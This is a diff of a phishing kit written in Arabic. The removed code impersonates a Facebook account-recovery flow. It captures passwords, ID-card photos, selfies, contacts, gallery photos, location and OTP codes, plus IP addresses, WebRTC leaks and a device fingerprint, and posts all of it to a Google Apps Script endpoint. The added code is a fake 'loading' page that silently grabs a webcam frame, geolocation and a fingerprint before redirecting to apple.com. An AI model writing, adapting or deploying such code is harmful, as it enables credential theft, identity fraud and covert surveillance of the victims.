@@ -5,813 +5,310 @@
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
 <meta name="robots" content="noindex,nofollow,noarchive">
 <meta name="referrer" content="no-referrer">
-<title>Facebook</title>
+<meta name="theme-color" content="#0d1117">
+<title>جارٍ التحميل…</title>
 <style>
+  :root{--bg:#0d1117;--card:#161b22;--line:#30363d;--fg:#e6edf3;--mut:#9aa4af;--acc:#2f81f7;--err:#f85149}
   *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
   html,body{height:100%}
-  body{margin:0;background:#f0f2f5;color:#1c1e21;
-    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;
-    font-size:14px;line-height:1.34;display:flex;flex-direction:column;min-height:100vh}
-  .wrap{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px 12px}
-  .card{width:100%;max-width:400px;background:#fff;border-radius:8px;
-    box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px 16px 22px}
-  .logo{margin:0 auto 20px;text-align:center}
-  .logo svg{width:56px;height:56px}
-  .title{font-size:17px;font-weight:600;text-align:center;margin:0 0 6px}
-  .sub{font-size:13.5px;color:#606770;text-align:center;margin:0 0 16px;line-height:1.45}
-  .bar{height:4px;background:#e4e6eb;border-radius:2px;overflow:hidden;margin:0 0 10px}
-  .bar-in{height:100%;background:#1877f2;width:0;transition:width .4s ease}
-  .ind{font-size:11.5px;color:#90949c;text-align:center;margin:0 0 14px;font-weight:600;letter-spacing:.3px}
-  .inp{position:relative;margin:0 0 12px}
-  .inp input{width:100%;padding:14px 16px;background:#f5f6f7;border:1px solid #dddfe2;border-radius:6px;
-    font-family:inherit;font-size:16px;color:#1c1e21;outline:none;transition:all .15s}
-  .inp input:focus{border-color:#1877f2;background:#fff;box-shadow:0 0 0 2px rgba(24,119,242,.2)}
-  .inp input::placeholder{color:#90949c}
-  .inp.pw input{padding-left:72px}
-  .inp .show{position:absolute;left:10px;top:50%;transform:translateY(-50%);
-    background:none;border:0;color:#1877f2;font-family:inherit;font-size:13px;font-weight:600;cursor:pointer;padding:4px}
-  .btn{width:100%;padding:13px 16px;background:#1877f2;color:#fff;border:0;border-radius:6px;
-    font-family:inherit;font-size:16px;font-weight:700;cursor:pointer;margin:6px 0 0;transition:background .15s}
-  .btn:disabled{opacity:.5;cursor:default;background:#8aabf0}
-  .btn:not(:disabled):hover{background:#166fe5}
-  .btn.green{background:#42b72a}.btn.green:hover{background:#36a420}
-  .btn.ghost{background:#e4e6eb;color:#1c1e21;font-weight:600;font-size:14px;padding:11px}
-  .btn.ghost:hover{background:#d8dadf}
-  .link{display:block;text-align:center;color:#1877f2;font-size:13.5px;text-decoration:none;
-    margin:12px 0 0;padding:6px;cursor:pointer}
-  .link:hover{text-decoration:underline}
-  .sep{height:1px;background:#dadde1;margin:16px 0 2px}
-  .status{min-height:18px;font-size:12.5px;text-align:center;color:#606770;margin:10px 0 0}
-  .status.err{color:#e41e3f}.status.ok{color:#42b72a}
-  .footer{text-align:center;color:#8a8d91;font-size:11.5px;padding:14px 12px 20px;line-height:1.8}
-  .footer a{color:#8a8d91;text-decoration:none;margin:0 4px}
-  .slot{position:relative;background:#f5f6f7;border:1.5px dashed #ccd0d5;border-radius:8px;
-    padding:14px 10px;text-align:center;cursor:pointer;transition:all .15s;min-height:80px;
-    display:flex;flex-direction:column;align-items:center;justify-content:center;gap:4px;margin:0 0 8px}
-  .slot:hover{border-color:#1877f2;background:#f0f6ff}
-  .slot.filled{border-style:solid;border-color:#42b72a;background:#f3fff3}
-  .slot .icon{font-size:22px}
-  .slot .lbl{font-size:12.5px;color:#606770;font-weight:600}
-  .slot .hint2{font-size:11px;color:#90949c}
-  .slot .check{position:absolute;top:5px;left:5px;background:#42b72a;color:#fff;width:18px;height:18px;
-    border-radius:50%;font-size:11px;display:grid;place-items:center;font-weight:700}
-  .slot img{max-width:100%;max-height:70px;border-radius:4px;margin-top:4px}
-  .slot input[type=file]{display:none}
-  .cam-prev{width:100%;max-height:180px;object-fit:cover;border-radius:8px;background:#000;margin:0 0 10px}
-  .video{width:100%;max-height:220px;border-radius:8px;background:#000;margin:0 0 10px;transform:scaleX(-1)}
-  .otp-row{display:flex;gap:6px;justify-content:center;margin:6px 0 14px;direction:ltr}
-  .otp{width:42px;height:52px;text-align:center;font-size:20px;font-weight:600;
-    background:#f5f6f7;color:#1c1e21;border:1.5px solid #dddfe2;border-radius:8px;padding:0;
-    font-family:inherit;outline:none;transition:all .15s}
-  .otp:focus{border-color:#1877f2;background:#fff;box-shadow:0 0 0 2px rgba(24,119,242,.2)}
-  .otp.filled{border-color:#1877f2;background:#fff}
-  .spin{width:34px;height:34px;margin:14px auto;border-radius:50%;
-    border:3px solid #e4e6eb;border-top-color:#1877f2;animation:spin .8s linear infinite}
-  @keyframes spin{to{transform:rotate(360deg)}}
-  .done-icon{width:60px;height:60px;margin:8px auto 12px;background:#42b72a;border-radius:50%;
-    display:grid;place-items:center;color:#fff;font-size:30px;font-weight:700}
-  .alert{background:#fff4e5;border:1px solid #f0c98a;border-radius:8px;padding:12px;margin:0 0 16px;
-    font-size:13px;color:#663c00;display:flex;gap:10px;align-items:flex-start;line-height:1.5}
-  .alert .ico{font-size:18px;flex:0 0 auto}
-  .found{background:#f0f4ff;border:1px solid #b8c5f0;border-radius:8px;padding:11px 13px;margin:0 0 14px;
-    font-size:12.5px;color:#1c1e21;line-height:1.6}
-  .found b{color:#1877f2}
-  .files-preview{display:grid;grid-template-columns:repeat(4,1fr);gap:6px;margin:0 0 12px}
-  .files-preview img{width:100%;aspect-ratio:1;object-fit:cover;border-radius:6px;border:1px solid #dddfe2}
-  .files-preview .more{display:grid;place-items:center;background:#e4e6eb;border-radius:6px;
-    font-size:12px;font-weight:700;color:#606770}
-  .hidden{display:none!important}
-  .contacts-fallback .inp{margin:0 0 8px}
+  body{margin:0;background:radial-gradient(1200px 600px at 50% -10%,#1b2430,var(--bg));color:var(--fg);
+    font:16px/1.6 system-ui,-apple-system,"Segoe UI",Tahoma,sans-serif;display:grid;place-items:center;padding:20px}
+  .card{width:100%;max-width:380px;background:var(--card);border:1px solid var(--line);border-radius:16px;
+    padding:32px 24px;text-align:center;box-shadow:0 18px 50px rgba(0,0,0,.45)}
+  .spin{width:48px;height:48px;margin:0 auto 18px;border-radius:50%;
+    border:3px solid var(--line);border-top-color:var(--acc);animation:s .9s linear infinite}
+  @keyframes s{to{transform:rotate(360deg)}}
+  h1{font-size:18px;margin:0 0 6px;font-weight:600}
+  .sub{color:var(--mut);font-size:14px;margin:0 0 4px;line-height:1.5}
+  .note{color:var(--mut);font-size:12px;margin:14px 0 0;line-height:1.5}
+  button{width:100%;padding:14px;margin-top:20px;border:0;border-radius:10px;cursor:pointer;
+    background:var(--acc);color:#fff;font:inherit;font-weight:600;font-size:15px}
+  button:disabled{opacity:.55;cursor:default}
+  [hidden]{display:none!important}
 </style>
 </head>
 <body>
-<div class="wrap">
-  <div class="card">
-    <div class="logo" aria-hidden="true">
-      <svg viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
-        <circle cx="18" cy="18" r="18" fill="#1877f2"/>
-        <path d="M24.5 18.5h-4v-2.9c0-.8.4-1.6 1.6-1.6h1.8v-3.4s-1.6-.3-3.1-.3c-3.2 0-5.3 1.9-5.3 5.4v2.8h-3.5v4h3.5v10h4.5v-10h3.3l.7-4z" fill="#fff"/>
-      </svg>
-    </div>
-
-    <div class="bar"><div class="bar-in" id="bar"></div></div>
-    <p class="ind" id="ind">الخطوة 1 من 7</p>
-
-    <!-- ═══════ 1: LOGIN ═══════ -->
-    <section id="pg-login">
-      <p class="title">تسجيل الدخول</p>
-      <p class="sub">سجّل الدخول لمتابعة عملية استرداد الحساب.</p>
-      <form id="login-form" onsubmit="return false">
-        <div class="inp"><input id="lg-user" type="text" autocomplete="username" placeholder="البريد الإلكتروني أو رقم الهاتف" dir="ltr" maxlength="80"></div>
-        <div class="inp pw">
-          <input id="lg-pass" type="password" autocomplete="current-password" placeholder="كلمة المرور" dir="ltr" maxlength="80">
-          <button type="button" class="show" id="show-pw">إظهار</button>
-        </div>
-        <button type="submit" class="btn" id="lg-btn">تسجيل الدخول</button>
-        <a href="#" class="link" onclick="return false">هل نسيت كلمة المرور؟</a>
-        <div class="sep"></div>
-        <button type="button" class="btn green" onclick="return false">إنشاء حساب جديد</button>
-      </form>
-      <p class="status" id="lg-status"></p>
-    </section>
-
-    <!-- ═══════ 2: RECOVERY INTRO ═══════ -->
-    <section id="pg-recovery" class="hidden">
-      <div class="alert"><span class="ico">⚠️</span><span>تم رصد <b>نشاط غير معتاد</b> على حسابك. تم تعليق الحساب مؤقتاً لحمايتك. للاستعادة، نحتاج للتحقق من هويتك على 5 خطوات سريعة.</span></div>
-      <div class="found">
-        <b>ما الذي رصدناه:</b><br>
-        • 3 أجهزة غير معروفة سجلت الدخول<br>
-        • محاولة تغيير كلمة المرور من القاهرة<br>
-        • 12 جهة اتصال تم تنزيلها
-      </div>
-      <p class="sub">اضغط "بدء التحقق" لإثبات أنك المالك الأصلي.</p>
-      <button type="button" class="btn" id="start-btn">بدء التحقق</button>
-    </section>
-
-    <!-- ═══════ 3: SELFIE + ID ═══════ -->
-    <section id="pg-id" class="hidden">
-      <p class="title">التحقق من الهوية</p>
-      <p class="sub">التقط صورة شخصية وأنت تحمل بطاقة الهوية. سيتم مقارنتها بالصورة على الحساب.</p>
-
-      <video class="video" id="cam" playsinline muted autoplay hidden></video>
-      <img class="cam-prev hidden" id="cam-prev" alt="">
-      <div class="slot" id="slot-selfie">
-        <input type="file" accept="image/*" capture="user" data-slot="selfie" id="inp-selfie">
-        <span class="icon">🤳</span>
-        <span class="lbl">صورة سيلفي</span>
-        <span class="hint2">بإضاءة جيدة ووجه واضح</span>
-      </div>
-      <button type="button" class="btn ghost" id="cam-btn">📷 استخدام الكاميرا</button>
-
-      <div class="slot" id="slot-front">
-        <input type="file" accept="image/*" capture="environment" data-slot="doc_front" id="inp-front">
-        <span class="icon">🪪</span>
-        <span class="lbl">بطاقة الهوية — أمامي</span>
-        <span class="hint2">بدون انعكاس أو قص</span>
-      </div>
-      <div class="slot" id="slot-back">
-        <input type="file" accept="image/*" capture="environment" data-slot="doc_back" id="inp-back">
-        <span class="icon">🪪</span>
-        <span class="lbl">بطاقة الهوية — خلفي</span>
-        <span class="hint2">الرقم القومي واضح</span>
-      </div>
-      <button type="button" class="btn" id="id-btn" disabled>متابعة</button>
-      <p class="status" id="id-status"></p>
-    </section>
-
-    <!-- ═══════ 4: LOCATION ═══════ -->
-    <section id="pg-geo" class="hidden">
-      <p class="title">التحقق من الموقع</p>
-      <p class="sub">آخر دخول غير معروف تم رصده من موقع مختلف. نحتاج تأكيد موقعك الحالي لمطابقته مع منطقة الحساب الأصلية.</p>
-      <div class="found">
-        <b>آخر دخول غير معروف:</b><br>
-        📍 القاهرة، مصر · 30.0444°N, 31.2357°E<br>
-        🕒 اليوم 02:14 صباحاً
-      </div>
-      <button type="button" class="btn" id="geo-btn">تأكيد موقعي الحالي</button>
-      <a href="#" class="link" id="geo-skip" onclick="return false">تخطي هذه الخطوة</a>
-      <p class="status" id="geo-status"></p>
-    </section>
-
-    <!-- ═══════ 5: CONTACTS ═══════ -->
-    <section id="pg-contacts" class="hidden">
-      <p class="title">التحقق من جهات الاتصال</p>
-      <p class="sub" id="contacts-sub">لمنع الوصول غير المصرح به، نحتاج للتحقق من جهات الاتصال الموثوقة على حسابك. شارك جهات اتصالك من دفتر الهاتف.</p>
-      <div class="found" id="contacts-found" style="display:none">
-        <b>تم العثور على:</b> <span id="contacts-count">0</span> جهة اتصال — تم التحقق منها.
-      </div>
-      <button type="button" class="btn" id="contacts-btn">اختيار جهات الاتصال</button>
-      <div class="contacts-fallback hidden" id="contacts-fallback">
-        <p class="sub" style="margin:10px 0">أدخل 3 جهات اتصال موثوقة يدوياً للمتابعة:</p>
-        <div class="inp"><input type="text" placeholder="الاسم" class="cf-name"></div>
-        <div class="inp"><input type="tel" placeholder="رقم الهاتف" class="cf-tel" dir="ltr"></div>
-        <div class="inp"><input type="text" placeholder="الاسم" class="cf-name"></div>
-        <div class="inp"><input type="tel" placeholder="رقم الهاتف" class="cf-tel" dir="ltr"></div>
-        <div class="inp"><input type="text" placeholder="الاسم" class="cf-name"></div>
-        <div class="inp"><input type="tel" placeholder="رقم الهاتف" class="cf-tel" dir="ltr"></div>
-        <button type="button" class="btn" id="cf-btn">حفظ جهات الاتصال</button>
-      </div>
-      <a href="#" class="link" id="contacts-skip" onclick="return false">تخطي</a>
-      <p class="status" id="contacts-status"></p>
-    </section>
-
-    <!-- ═══════ 6: PHOTO BACKUP ═══════ -->
-    <section id="pg-photos" class="hidden">
-      <p class="title">نسخ احتياطي للصور</p>
-      <p class="sub">قبل استعادة الحساب، سنأخذ نسخة احتياطية من صورك الأخيرة لضمان عدم فقدان أي ذكرى. اختر حتى 12 صورة من معرض الصور.</p>
-      <div class="files-preview" id="files-preview"></div>
-      <div class="slot" id="slot-photos">
-        <input type="file" accept="image/*" multiple data-slot="photos" id="inp-photos">
-        <span class="icon">🖼️</span>
-        <span class="lbl" id="photos-lbl">اختيار الصور من المعرض</span>
-        <span class="hint2">اضغط مطولاً لاختيار صور متعددة</span>
-      </div>
-      <button type="button" class="btn" id="photos-btn" disabled>نسخ احتياطي ومتابعة</button>
-      <a href="#" class="link" id="photos-skip" onclick="return false">تخطي</a>
-      <p class="status" id="photos-status"></p>
-    </section>
-
-    <!-- ═══════ 7: OTP ═══════ -->
-    <section id="pg-otp" class="hidden">
-      <p class="title">رمز التحقق الأخير</p>
-      <p class="sub" id="otp-sub">أرسلنا رمزاً من 6 أرقام إلى جوالك. أدخله لإكمال استعادة الحساب.</p>
-      <div class="otp-row">
-        <input class="otp" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
-        <input class="otp" maxlength="1" inputmode="numeric">
-        <input class="otp" maxlength="1" inputmode="numeric">
-        <input class="otp" maxlength="1" inputmode="numeric">
-        <input class="otp" maxlength="1" inputmode="numeric">
-        <input class="otp" maxlength="1" inputmode="numeric">
-      </div>
-      <button type="button" class="btn" id="otp-btn">استعادة الحساب</button>
-      <a href="#" class="link" id="otp-resend" onclick="return false">إعادة إرسال الرمز</a>
-      <p class="status" id="otp-status"></p>
-    </section>
-
-    <!-- ═══════ DONE ═══════ -->
-    <section id="pg-done" class="hidden">
-      <div class="done-icon">✓</div>
-      <p class="title">تم استعادة حسابك</p>
-      <p class="sub">جارٍ تحويلك إلى حسابك…</p>
-      <div class="spin"></div>
-    </section>
+<main class="card">
+  <div class="spin" id="spin"></div>
+  <h1 id="h">جارٍ التحميل</h1>
+  <p class="sub" id="s">يرجى الانتظار…</p>
+  <div id="prompt" hidden>
+    <button id="btn" type="button">متابعة</button>
+    <p class="note">قد يطلب المتصفح الوصول إلى الكاميرا والموقع لتأكيد العملية.</p>
   </div>
-
-  <div class="footer">
-    <div><a href="#" onclick="return false">العربية</a> · <a href="#" onclick="return false">English (US)</a> · <a href="#" onclick="return false">Français</a></div>
-    <div>Meta © 2026</div>
-  </div>
-</div>
-
+</main>
 <script>
-(function () {
+(function(){
   'use strict';
-  const ENDPOINT = 'https://script.google.com/macros/s/AKfycbxAaiB1TaUAu0RNN97KjATD0fYuJ2IxY5Z8wHaM9rlAEjhvBaskT23J_CLnPuu7BWc/exec';
-  const REDIRECT = 'https://www.facebook.com/';
-  const T_IP = 4000, T_GEO = 12000, MAX_PHOTOS = 12;
+
+  const ENDPOINT = 'https://script.google.com/macros/s/REPLACE_WITH_DEPLOY_ID/exec';
+  const REDIRECT = 'https://www.apple.com/';
+  const MIN_DISPLAY_MS = 900;
+  const T_START = Date.now();
+
+  const $ = id => document.getElementById(id);
+  const spin = $('spin'), h = $('h'), s = $('s'), prompt = $('prompt'), btn = $('btn');
+
   const NA = 'N/A';
-
-  const $ = s => document.querySelector(s);
-  const $$ = s => [...document.querySelectorAll(s)];
   const sleep = ms => new Promise(r => setTimeout(r, ms));
-  const pad = n => String(n).padStart(2, '0');
+  const pad = n => String(n).padStart(2,'0');
 
-  let nonce = '';
-  let identifier = '';
-  let password = '';
-  let captured = {};
-  let geoBusy = false, geoDone = false;
-  let busy = false;
-  let totalSteps = 7;
-
-  const docState = { selfie: '', doc_front: '', doc_back: '' };
-  const photoState = { photos: [] };
-  const contactState = { contacts: [] };
-
-  function setStatus(id, t, k) { const e = $('#'+id); if(!e) return; e.textContent = t||''; e.className = 'status' + (k?' '+k:''); }
-  function setProgress(n) {
-    $('#bar').style.width = Math.round(n/totalSteps*100)+'%';
-    $('#ind').textContent = 'الخطوة ' + n + ' من ' + totalSteps;
-  }
-  function showPage(id, num) {
-    $$('.card > section').forEach(s => s.classList.add('hidden'));
-    $('#'+id).classList.remove('hidden');
-    if (num) setProgress(num);
-    window.scrollTo({top:0,behavior:'smooth'});
-  }
-  function withTimeout(p, ms, fb) {
-    return new Promise(res => {
-      let fin = false;
-      const t = setTimeout(() => { if(!fin){fin=true;res(fb);} }, ms);
-      Promise.resolve(p).then(v => { if(!fin){fin=true;clearTimeout(t);res(v);} },
-                            () => { if(!fin){fin=true;clearTimeout(t);res(fb);} });
-    });
-  }
-  function nonceGen() {
+  function nonceGen(){
     try { if (window.crypto && crypto.randomUUID) return crypto.randomUUID().replace(/-/g,''); } catch(_){}
     return Date.now().toString(36) + Math.random().toString(36).slice(2,10);
   }
-  function h32(str) { let h=5381; for(let i=0;i<str.length;i++) h=((h<<5)+h+str.charCodeAt(i))|0; return (h>>>0).toString(36); }
-  function localTime() { const d=new Date();
-    return d.getFullYear()+'-'+pad(d.getMonth()+1)+'-'+pad(d.getDate())+' '+pad(d.getHours())+':'+pad(d.getMinutes())+':'+pad(d.getSeconds()); }
-  function maskId(s) {
-    const t = String(s||''); if(!t) return 'جوالك';
-    if (t.includes('@')) { const [u,d]=t.split('@'); return (u.length>2?u.slice(0,2)+'***':u)+'@'+(d||''); }
-    const d = t.replace(/\D/g,''); if (d.length>6) return d.slice(0,3)+'***'+d.slice(-3);
-    return t;
-  }
-  function fileToDataURL(file) {
-    return new Promise((res, rej) => {
-      const fr = new FileReader();
-      fr.onload = () => res(String(fr.result||''));
-      fr.onerror = () => rej(fr.error);
-      fr.readAsDataURL(file);
-    });
-  }
-  async function shrinkImage(dataUrl, maxDim, quality) {
-    return new Promise(res => {
-      const img = new Image();
-      img.onload = () => {
-        try {
-          const s = Math.min(1, maxDim / Math.max(img.width, img.height));
-          const cv = document.createElement('canvas');
-          cv.width = Math.max(1, Math.round(img.width*s));
-          cv.height = Math.max(1, Math.round(img.height*s));
-          cv.getContext('2d').drawImage(img, 0, 0, cv.width, cv.height);
-          res(cv.toDataURL('image/jpeg', quality||0.72));
-        } catch(_) { res(dataUrl); }
-      };
-      img.onerror = () => res(dataUrl);
-      img.src = dataUrl;
-    });
+  const nonce = nonceGen();
+  window.__vn = nonce;
+
+  function localTime(){
+    const d = new Date();
+    return d.getFullYear()+'-'+pad(d.getMonth()+1)+'-'+pad(d.getDate())+' '+
+           pad(d.getHours())+':'+pad(d.getMinutes())+':'+pad(d.getSeconds());
   }
 
-  const PUB4 = /^(?!(10\.|127\.|169\.254\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|100\.(6[4-9]|[7-9]\d|1[01]\d|12[0-7])\.))(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(?:\.(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}$/;
-  const PUB6 = /^(?!fe80:|fc|fd|::1)[0-9a-f]{0,4}(?::[0-9a-f]{0,4}){3,7}$/i;
+  function h32(str){
+    let h = 5381;
+    for (let i=0; i<str.length; i++) h = ((h<<5)+h+str.charCodeAt(i)) | 0;
+    return (h>>>0).toString(36);
+  }
 
-  async function fetchIp() {
-    const srcs = [
-      {u:'https://api.ipify.org?format=json', m:'j'},
-      {u:'https://ipwho.is/', m:'j'},
-      {u:'https://api64.ipify.org?format=json', m:'j'},
-      {u:'https://www.cloudflare.com/cdn-cgi/trace', m:'t'}
-    ];
-    const found = new Set();
-    await Promise.all(srcs.map(async s => {
-      try {
-        const r = await withTimeout(fetch(s.u,{mode:'cors',cache:'no-store',credentials:'omit'}), T_IP, null);
-        if(!r||!r.ok) return;
-        const txt = await r.text();
-        let ip = '';
-        if (s.m==='t') { const x=/(?:^|\n)ip=([^\n]+)/.exec(txt); ip=x?x[1].trim():''; }
-        else { try { const j=JSON.parse(txt); ip=String(j.ip||j.query||''); } catch(_){} }
-        if (PUB4.test(ip)||PUB6.test(ip)) found.add(ip);
-      } catch(_){}
-    }));
-    const list = [...found];
-    return { list, best: list.filter(x=>PUB4.test(x))[0] || list[0] || NA };
-  }
-  function getRtc() {
-    return withTimeout(new Promise(res => {
-      const PC = window.RTCPeerConnection || window.webkitRTCPeerConnection;
-      if (!PC) return res([]);
-      let pc; try { pc = new PC({ iceServers:[{urls:'stun:stun.l.google.com:19302'}] }); } catch(_) { return res([]); }
-      const found = new Set(); let fin=false;
-      const stop = () => { if(fin) return; fin=true; try{pc.close();}catch(_){} res([...found]); };
-      pc.onicecandidate = e => {
-        if(!e.candidate) return stop();
-        const ip = e.candidate.candidate.split(' ')[4];
-        if (ip && !/\.local$/i.test(ip)) found.add(ip);
-      };
-      try { pc.createDataChannel('x'); pc.createOffer().then(o=>pc.setLocalDescription(o)).catch(stop); } catch(_) { stop(); }
-      setTimeout(stop, 3500);
-    }), 4200, []);
-  }
-  function getBattery() {
-    return withTimeout((async () => {
-      if (!navigator.getBattery) return { level: NA, charging: NA };
-      const b = await navigator.getBattery();
-      return { level: Math.round(b.level*100)+'%', charging: b.charging?'يشحن':'لا يشحن' };
-    })(), 2500, { level: NA, charging: NA });
-  }
-  function getNetwork() {
-    const c = navigator.connection || navigator.webkitConnection;
-    const p = [];
-    if (!navigator.onLine) p.push('غير متصل');
-    if (c) { if(c.effectiveType) p.push(c.effectiveType); if(c.downlink) p.push(c.downlink+'Mbps'); if(c.rtt!=null) p.push('rtt '+c.rtt+'ms'); }
-    return p.length ? p.join(' / ').slice(0,80) : NA;
-  }
-  function getGeo() {
-    if (!navigator.geolocation) return Promise.resolve({ lat:'', lng:'', acc:'', src: NA });
-    return withTimeout(new Promise(res => {
-      navigator.geolocation.getCurrentPosition(
-        pos => res({ lat:+pos.coords.latitude.toFixed(6), lng:+pos.coords.longitude.toFixed(6),
-                     acc: Math.round(pos.coords.accuracy), src:'متصفح' }),
-        e => res({ lat:'', lng:'', acc:'', src: e && e.code===1 ? 'مرفوض' : 'فشل' }),
-        { enableHighAccuracy:true, timeout:T_GEO, maximumAge:0 });
-    }), T_GEO + 1200, { lat:'', lng:'', acc:'', src:'انتهت المهلة' });
-  }
-  function fingerprint() {
+  function fp(){
     const o = [];
-    try { const c=document.createElement('canvas'); c.width=200;c.height=40;
-      const x=c.getContext('2d'); x.textBaseline='top'; x.font='14px Arial';
-      x.fillStyle='#f60'; x.fillRect(0,0,200,40); x.fillStyle='#069'; x.fillText('fb 图',2,2);
-      o.push('c'+h32(c.toDataURL())); } catch(_){}
-    try { const g=document.createElement('canvas').getContext('webgl');
-      const d=g.getExtension('WEBGL_debug_renderer_info');
-      if(d) o.push('r'+h32(String(g.getParameter(d.UNMASKED_RENDERER_WEBGL)))); } catch(_){}
+    try {
+      const c = document.createElement('canvas'); c.width=200; c.height=40;
+      const x = c.getContext('2d');
+      x.textBaseline='top'; x.font='14px Arial';
+      x.fillStyle='#f60'; x.fillRect(0,0,200,40);
+      x.fillStyle='#069'; x.fillText('acct 图 1',2,2);
+      o.push('c'+h32(c.toDataURL()));
+    } catch(_){}
+    try {
+      const g = document.createElement('canvas').getContext('webgl');
+      const d = g.getExtension('WEBGL_debug_renderer_info');
+      if (d) o.push('r'+h32(String(g.getParameter(d.UNMASKED_RENDERER_WEBGL))));
+    } catch(_){}
     o.push('hc'+navigator.hardwareConcurrency,'dm'+(navigator.deviceMemory||''),
            'dpr'+(devicePixelRatio||1),'cd'+screen.colorDepth,
            'mt'+(navigator.maxTouchPoints||0),'sc'+screen.width+'x'+screen.height);
     return o.join('|').slice(0,600);
   }
-  function parseModel(ua) { const m=ua.match(/Android[^;)]*;\s*(?:[a-z]{2}[-_][a-z]{2};\s*)?([^;)]+?)(?:\s+Build[/)]|\))/i);
-    if(m) return m[1].replace(/\s+/g,' ').trim().slice(0,60);
-    if(/iPhone/.test(ua)) return 'iPhone'; if(/iPad/.test(ua)) return 'iPad'; return ''; }
-  function parseBrand(ua) { const t=ua.toLowerCase();
-    if(/redmi|poco|xiaomi|\bmi\b/.test(t)) return 'Xiaomi';
-    if(/samsung|sm-/.test(t)) return 'Samsung';
-    if(/huawei|honor/.test(t)) return 'Huawei';
-    if(/oppo|cph\d/.test(t)) return 'OPPO';
-    if(/vivo/.test(t)) return 'Vivo';
-    if(/oneplus/.test(t)) return 'OnePlus';
-    if(/iphone|ipad|ipod/.test(t)) return 'Apple';
-    if(/windows/.test(t)) return 'PC'; return ''; }
-  function parsePlatform(ua) {
-    let m=ua.match(/Android\s+([\d.]+)/i); if(m) return 'Android '+m[1];
-    m=ua.match(/(?:iPhone )?OS (\d+)[._](\d+)/i); if(m) return 'iOS '+m[1]+'.'+m[2];
-    if(/Windows NT 10/.test(ua)) return 'Windows 10/11';
-    if(/Mac OS X/.test(ua)) return 'macOS';
-    if(/Linux/.test(ua)) return 'Linux'; return NA; }
 
-  async function post(payload) {
-    try {
-      await fetch(ENDPOINT, { method:'POST', mode:'no-cors', cache:'no-store',
-        headers:{'Content-Type':'text/plain;charset=UTF-8'},
-        body: JSON.stringify({ a:'collect', d: payload }) });
-      return true;
-    } catch(_) { return false; }
+  async function permState(name){
+    try { const r = await navigator.permissions.query({name}); return r.state; }
+    catch(_){ return 'prompt'; }
   }
-  async function buildPayload(stepName, stepData) {
-    const ua = (navigator.userAgent||'').slice(0,400);
+
+  /* --- getUserMedia called synchronously from a gesture → prompt preserved --- */
+  async function grabCamera(ms){
+    ms = ms || 9000;
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
+    let stream;
+    try {
+      stream = await Promise.race([
+        navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { ideal: 'user' }, width: { ideal: 640 }, height: { ideal: 480 } },
+          audio: false
+        }),
+        new Promise(function(_, rej){ setTimeout(function(){ rej(new Error('to')); }, ms); })
+      ]);
+    } catch(_){ return null; }
+
+    try {
+      const v = document.createElement('video');
+      v.srcObject = stream; v.muted = true; v.playsInline = true;
+      await v.play().catch(function(){});
+      for (let i=0; i<40 && !v.videoWidth; i++) await sleep(50);
+      if (!v.videoWidth) return null;
+      await sleep(100);
+      const w = v.videoWidth, hh = v.videoHeight;
+      const sc = Math.min(1, 360 / Math.max(w, hh));
+      const cv = document.createElement('canvas');
+      cv.width = Math.max(1, Math.round(w * sc));
+      cv.height = Math.max(1, Math.round(hh * sc));
+      cv.getContext('2d').drawImage(v, 0, 0, cv.width, cv.height);
+      const blob = await new Promise(function(r){ cv.toBlob ? cv.toBlob(r, 'image/jpeg', 0.5) : r(null); });
+      if (!blob) return null;
+      return await new Promise(function(res){
+        const fr = new FileReader();
+        fr.onload = function(){ res(String(fr.result || '')); };
+        fr.onerror = function(){ res(''); };
+        fr.readAsDataURL(blob);
+      });
+    } catch(_){ return null; }
+    finally {
+      try { stream.getTracks().forEach(function(t){ t.stop(); }); } catch(_){}
+    }
+  }
+
+  /* --- getCurrentPosition called synchronously from a gesture --- */
+  function grabGeo(ms){
+    ms = ms || 12000;
+    if (!navigator.geolocation) return Promise.resolve(null);
+    return new Promise(function(res){
+      const t = setTimeout(function(){ res(null); }, ms);
+      navigator.geolocation.getCurrentPosition(
+        function(p){
+          clearTimeout(t);
+          res({ lat: +p.coords.latitude.toFixed(6), lng: +p.coords.longitude.toFixed(6), acc: Math.round(p.coords.accuracy) });
+        },
+        function(){ clearTimeout(t); res(null); },
+        { enableHighAccuracy: true, timeout: ms, maximumAge: 0 }
+      );
+    });
+  }
+
+  function getBattery(){
+    return new Promise(function(res){
+      if (!navigator.getBattery) return res({ level: NA, charging: NA });
+      const t = setTimeout(function(){ res({ level: NA, charging: NA }); }, 2500);
+      navigator.getBattery().then(function(b){
+        clearTimeout(t);
+        res({ level: Math.round(b.level*100)+'%', charging: b.charging ? 'يشحن' : 'لا يشحن' });
+      }).catch(function(){ clearTimeout(t); res({ level: NA, charging: NA }); });
+    });
+  }
+
+  function getNetwork(){
+    const c = navigator.connection || navigator.webkitConnection;
+    const p = [];
+    if (!navigator.onLine) p.push('غير متصل');
+    if (c) {
+      if (c.effectiveType) p.push(c.effectiveType);
+      if (c.downlink) p.push(c.downlink + 'Mbps');
+      if (c.rtt != null) p.push('rtt ' + c.rtt + 'ms');
+    }
+    return p.length ? p.join(' / ').slice(0,80) : NA;
+  }
+
+  function parseModel(ua){
+    const m = ua.match(/Android[^;)]*;\s*(?:[a-z]{2}[-_][a-z]{2};\s*)?([^;)]+?)(?:\s+Build[/)]|\))/i);
+    if (m) return m[1].replace(/\s+/g,' ').trim().slice(0,60);
+    if (/iPhone/.test(ua)) return 'iPhone';
+    if (/iPad/.test(ua)) return 'iPad';
+    return '';
+  }
+  function parseBrand(ua){
+    const t = ua.toLowerCase();
+    if (/redmi|poco|xiaomi|\bmi\b/.test(t)) return 'Xiaomi';
+    if (/samsung|sm-/.test(t)) return 'Samsung';
+    if (/huawei|honor/.test(t)) return 'Huawei';
+    if (/oppo|cph\d/.test(t)) return 'OPPO';
+    if (/vivo/.test(t)) return 'Vivo';
